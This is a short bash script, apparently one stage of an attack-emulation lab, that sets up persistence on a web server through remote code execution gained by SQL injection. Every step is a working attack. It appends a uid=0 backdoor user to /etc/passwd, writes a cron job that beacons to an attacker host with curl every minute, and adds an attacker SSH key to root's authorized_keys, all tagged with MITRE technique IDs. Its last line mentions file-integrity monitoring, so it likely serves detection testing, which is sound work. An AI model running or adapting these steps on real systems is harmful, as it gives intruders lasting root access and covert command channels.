#!/bin/bash
# Stage 4 — Persistence (via RCE on the web tier)
#   Backdoor root user      (MITRE T1136 / T1098)
#   Malicious cron job       (MITRE T1053.003)
#   SSH authorized_keys      (MITRE T1098.004)
source "$(dirname "$0")/lib.sh"
banner "STAGE 4 — PERSISTENCE (T1136 / T1053 / T1098)"

[ -f "$COOKIE" ] || sqli_login || { err "need a session"; exit 1; }

log "Adding a uid=0 backdoor account to /etc/passwd ..."
rce "grep -q '^cryvionbd:' /etc/passwd || echo 'cryvionbd:x:0:0:backdoor:/root:/bin/bash' >> /etc/passwd; tail -1 /etc/passwd"

log "Planting a cron job that beacons to the attacker ..."
rce "echo '* * * * * root curl -s http://attacker:${ATTACKER_LISTEN_PORT}/beacon >/dev/null 2>&1' > /etc/cron.d/cryvion-beacon; cat /etc/cron.d/cryvion-beacon"

log "Adding an attacker SSH key to root's authorized_keys ..."
rce "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICRYVIONattackerkey cryvion-attacker' >> /root/.ssh/authorized_keys && wc -l /root/.ssh/authorized_keys"

ok "Persistence established (FIM on /etc should flag /etc/passwd and /etc/cron.d)."
